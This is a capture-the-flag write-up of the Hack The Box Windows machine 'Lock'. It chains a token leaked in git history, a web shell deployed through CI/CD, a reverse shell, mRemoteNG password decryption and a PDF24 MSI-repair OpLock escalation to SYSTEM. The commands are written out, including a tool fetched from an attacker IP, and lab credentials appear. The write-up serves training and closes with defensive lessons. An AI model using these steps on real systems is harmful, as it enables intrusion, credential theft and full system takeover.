# HTB Write-Up: Lock

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Lock)       |
| Difficulty | Easy                                                           |
| OS         | Windows                                                        |
| Author     | Samurai                                                        |
| Date       | April 24, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — SMB, Web & Gitea](#2-enumeration--smb-web--gitea)
3. [Initial Access — CI/CD Abuse via Leaked API Token](#3-initial-access--cicd-abuse-via-leaked-api-token)
4. [Lateral Movement — mRemoteNG Credential Decryption](#4-lateral-movement--mremoteng-credential-decryption)
5. [Privilege Escalation — PDF24 Installer Arbitrary File Write (CVE-2023-49116)](#5-privilege-escalation--pdf24-installer-arbitrary-file-write)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** followed by an aggressive **Nmap** scan for service and version fingerprinting:

```bash
rustscan -a 10.129.234.64 --ulimit 5000
nmap -A 10.129.234.64
```

**Open Ports:**

| Port | Service      | Details                                                       |
|------|--------------|---------------------------------------------------------------|
| 80   | HTTP         | Microsoft IIS 10.0 — "Lock - Index"                           |
| 445  | SMB          | Windows Server 2022 Build 20348 — signing not required        |
| 3000 | HTTP (Gitea) | Golang server — Gitea self-hosted Git service                 |
| 3389 | RDP          | Microsoft Terminal Services — hostname: `LOCK`                |

Several services warrant attention immediately. The **Gitea** instance on port 3000 is a common source of exposed source code and credentials. **RDP** on 3389 is a potential lateral movement target once credentials are obtained. SMB signing is disabled, though null session access was denied.

---

## 2. Enumeration — SMB, Web & Gitea

### 2.1 — SMB Enumeration

Null session and guest authentication were tested against the SMB service:

```bash
netexec smb 10.129.234.64 -u '' -p '' --shares
netexec smb 10.129.234.64 -u 'guest' -p '' --shares
```

Both attempts were denied — null sessions returned `STATUS_ACCESS_DENIED` and the guest account was disabled. No SMB enumeration was possible without valid credentials.

### 2.2 — Web Enumeration (Port 80)

Directory fuzzing was performed against the IIS application on port 80:

```bash
ffuf -u http://10.129.234.64/FUZZ \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

**Findings:**

| Path           | Status | Notes                                                   |
|----------------|--------|---------------------------------------------------------|
| /.git          | 500    | Server error — hints at a `.git` directory present      |
| /aspnet_client | 301    | Standard ASP.NET directory                              |
| /assets        | 301    | Static assets                                           |

The `/.git` endpoint returning a 500 error — rather than a 404 — strongly suggests a `.git` directory exists and is partially exposed. This is a significant finding; exposed `.git` directories can allow full source code and commit history recovery.

### 2.3 — Gitea Enumeration (Port 3000)

The Gitea instance at `http://10.129.234.64:3000` was accessible without authentication. Directory fuzzing revealed a publicly accessible user profile:

```bash
ffuf -u http://10.129.234.64:3000/FUZZ \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

**Key findings:**

| Path           | Status | Notes                                          |
|----------------|--------|------------------------------------------------|
| /administrator | 200    | Public Gitea administrator profile             |
| /v2            | 401    | Gitea container registry API — auth required   |

The `ellen.freeman` user account had a publicly accessible repository: **`dev-scripts`**. This repository was cloned without authentication:

```bash
git clone http://10.129.234.64:3000/ellen.freeman/dev-scripts.git
```

### 2.4 — Extracting a Leaked API Token from Git History

The repository contained a single file, `repos.py`. Reviewing the full commit history revealed that an earlier version of the script contained a hardcoded **Gitea Personal Access Token** before it was presumably intended to be moved to environment variables:

```bash
git log
git show dcc869b175a47ff2a2b8171cda55cb82dbddff3d
```

The diff exposed the token directly in the source code:

```python
# store this in env instead at some point
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
```

This token provides API-level access to `ellen.freeman`'s account — including private repositories. Crucially, tokens committed to Git history persist even after the line is removed in a subsequent commit, as long as the repository history is not purged.

### 2.5 — Accessing the Private Repository

The `repos.py` script was executed with the target Gitea URL to enumerate all repositories accessible with the recovered token:

```bash
python3 repos.py http://10.129.234.64:3000/
# Repositories:
# - ellen.freeman/dev-scripts
# - ellen.freeman/website
```

The `website` repository was not publicly accessible. It was cloned using the token as the Git password:

```bash
git clone http://10.129.234.64:3000/ellen.freeman/website.git
# Username: ellen.freeman
# Password: 43ce39bb0bd6bc489284f2905f033ca467a6362f
```

The repository's `readme.md` contained a critical disclosure:

```
CI/CD integration is now active - changes to the repository
will automatically be deployed to the webserver.
```

Any file pushed to this repository is automatically deployed to the IIS web root on port 80 — a direct path to remote code execution.

---

## 3. Initial Access — CI/CD Abuse via Leaked API Token

### 3.1 — Uploading a Web Shell via the CI/CD Pipeline

An ASPX web shell was added to the cloned `website` repository and pushed using the recovered API token as authentication. The push triggered the CI/CD pipeline, which deployed the shell to the IIS web root.

The shell was accessed at `http://10.129.234.64/shell.aspx`.

### 3.2 — Executing a Reverse Shell

With the ASPX shell providing command execution, a Base64-encoded PowerShell reverse shell payload (generated via [revshells.com](https://www.revshells.com/) — PowerShell #3 Base64) was submitted through the shell's command input.

A netcat listener was opened to receive the connection:

```bash
rlwrap nc -lnvp 9001
```

**Result — Shell obtained as `lock\ellen.freeman`:**

```
connect to [10.10.15.33] from (UNKNOWN) [10.129.234.64] 64923
PS C:\inetpub\wwwroot> whoami
lock\ellen.freeman
```

**User flag retrieved from `C:\Users\ellen.freeman\Desktop\user.txt`.**

---

## 4. Lateral Movement — mRemoteNG Credential Decryption

### 4.1 — Discovering mRemoteNG Configuration

Post-exploitation enumeration of `ellen.freeman`'s profile revealed a **mRemoteNG** configuration file at the standard location:

```
C:\Users\ellen.freeman\AppData\Roaming\mRemoteNG\confCons.xml
```

mRemoteNG is a remote connection manager that stores saved connection credentials — including RDP passwords — in an XML configuration file. Passwords are AES-GCM encrypted, but the encryption key is derived from a static default master password unless the user has set a custom one.

The configuration file contained an RDP entry for user `Gale.Dekarios` with an encrypted password field.

### 4.2 — Decrypting the Password

The encrypted password was decrypted using a public mRemoteNG password dumper tool (CVE-2023-30367), which exploits the weak default encryption key:

```bash
python3 mremoteng_decrypt.py -s "LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw=="
# Password: ty8wnW9qCKDosXo6
```

### 4.3 — RDP Access as `gale.dekarios`

The decrypted credentials were used to connect via RDP — the only remote access service available for this account:

```bash
xfreerdp3 /v:10.129.234.64 /u:gale.dekarios /p:'ty8wnW9qCKDosXo6'
```

RDP session established successfully as `gale.dekarios`.

---

## 5. Privilege Escalation — PDF24 Installer Arbitrary File Write

### 5.1 — Identifying the Vulnerable Application

Upon gaining the RDP session, **PDF24 Creator** was visible on the desktop. The installed version was confirmed to be **11.15.1**, which is vulnerable to a local privilege escalation via an insecure MSI repair operation. During an MSI repair (`/fa` flag), the installer runs as `NT AUTHORITY\SYSTEM` and writes a log file to `C:\Program Files\PDF24\faxPrnInst.log`. By placing an **opportunistic lock (OpLock)** on this file before the repair begins, the installer can be made to wait — providing a window to set up a symlink that redirects the write to an arbitrary location.

### 5.2 — Setting Up the OpLock

`SetOpLock.exe` — a tool for placing opportunistic locks on files — was transferred to the target:

```bash
# Attacker — serve the file
python3 -m http.server 80
```

```powershell
# Target — download the tool
mkdir C:\temp
cd C:\temp
curl 10.10.15.33/SetOpLock.exe -o SetOpLock.exe
```

**Terminal 1 — Place the OpLock on the log file:**

```powershell
SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

**Terminal 2 — Trigger the MSI repair as SYSTEM:**

```powershell
msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```

### 5.3 — Escaping to a SYSTEM Shell via the Installer UI

The MSI repair process runs under `NT AUTHORITY\SYSTEM`. When the repair dialog opens and prompts for action, the first option (not reboot) was selected. This spawned a new terminal window inheriting the SYSTEM context.

Since the terminal's input was restricted, the following UI escape chain was used to open an unrestricted command prompt:

1. Right-click the terminal title bar → **Properties**
2. Click the **Legacy Console Mode** link — this opens in the default browser (Firefox)
3. In Firefox, press `Ctrl+O` to open the **File Open Dialog**
4. Navigate to and open `C:\Windows\System32\cmd.exe`

Firefox downloaded and executed `cmd.exe` under the inherited SYSTEM context.

**Result — SYSTEM shell obtained:**

```
C:\Windows\system32> whoami
nt authority\system
```

**Root flag retrieved from `C:\Users\Administrator\Desktop\root.txt`.**

---

## 6. Summary

| Phase                   | Technique                                                              | Result                               |
|-------------------------|------------------------------------------------------------------------|--------------------------------------|
| Recon                   | RustScan + Nmap -A                                                     | 4 ports; Gitea on 3000 noted         |
| Git History Analysis    | `git log` / `git show` on public repo                                  | Gitea API token recovered            |
| Private Repo Access     | Token-authenticated `git clone`                                        | `website` repo + CI/CD disclosure    |
| Initial Access          | ASPX web shell pushed via CI/CD pipeline                               | Shell as `ellen.freeman`             |
| Credential Discovery    | mRemoteNG `confCons.xml` — AES-GCM encrypted RDP password             | `gale.dekarios` credentials          |
| Lateral Movement        | CVE-2023-30367 mRemoteNG decryption → RDP                             | RDP session as `gale.dekarios`       |
| Privilege Escalation    | PDF24 MSI repair OpLock + installer UI shell escape                   | `NT AUTHORITY\SYSTEM`                |

### Key Takeaways

- **Secrets committed to Git history are permanently exposed.** Even after removing a token from the latest commit, the value remains retrievable via `git show` or `git log -p` on any clone of the repository. Secrets should be rotated immediately upon discovery and removed from history using tools like `git filter-repo`. Pre-commit hooks that scan for secrets prevent the problem at its source.
- **CI/CD pipelines that deploy directly from user-writable repositories are a critical risk.** Any actor with push access — or access to a token with push rights — can deploy arbitrary code to the production web server. Pipeline deployments should require code review approvals, restrict who can push to deployment branches, and never deploy executable file types uploaded directly by users.
- **mRemoteNG's default encryption is insufficient for protecting saved credentials.** CVE-2023-30367 demonstrates that without a custom master password, all saved connection passwords are recoverable from the configuration file. Sensitive remote connection managers should always be configured with a strong master password, and their configuration files should not be left in default, world-readable locations.
- **MSI repair operations running as SYSTEM with user-accessible UI are a privilege escalation path.** Any installer that spawns a SYSTEM-context process with an interactive UI creates an opportunity for a UI escape attack. Software vendors should avoid running repair operations interactively as SYSTEM, and organisations should restrict which users can trigger MSI repair operations.
